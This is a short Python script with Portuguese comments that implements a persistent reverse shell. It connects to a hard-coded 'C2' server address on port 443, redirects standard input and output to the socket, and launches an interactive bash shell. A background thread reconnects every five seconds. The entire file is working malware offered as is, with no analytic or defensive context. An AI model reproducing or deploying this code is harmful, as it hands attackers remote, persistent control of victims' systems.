#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket
import subprocess
import os
import time
import threading

# Endereço do servidor C2 e porta
C2_HOST = "172.16.254.251"
C2_PORT = 443

def remote_shell():
    #print("Remote shell iniciado")
    try:
        # Conectar ao servidor C2
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((C2_HOST, C2_PORT))
        
        # Redirecionar a entrada e a saída padrão para o socket
        os.dup2(sock.fileno(), 0)  # Redirecionar a entrada padrão para o socket
        os.dup2(sock.fileno(), 1)  # Redirecionar a saída padrão para o socket
        os.dup2(sock.fileno(), 2)  # Redirecionar a saída de erro padrão para o socket
        
        # Executar um shell
        subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        print(f"Erro ao conectar ao servidor C2: {e}")
        sock.close()

def loop_remote_shell():
    while True:
        remote_shell()
        time.sleep(5)  # Aguardar 5 segundos antes de tentar conectar novamente

# Iniciar a thread em segundo plano
shell_thread = threading.Thread(target=loop_remote_shell)
shell_thread.daemon = True
shell_thread.start()

# Aguardar para que a thread não termine imediatamente
shell_thread.join()

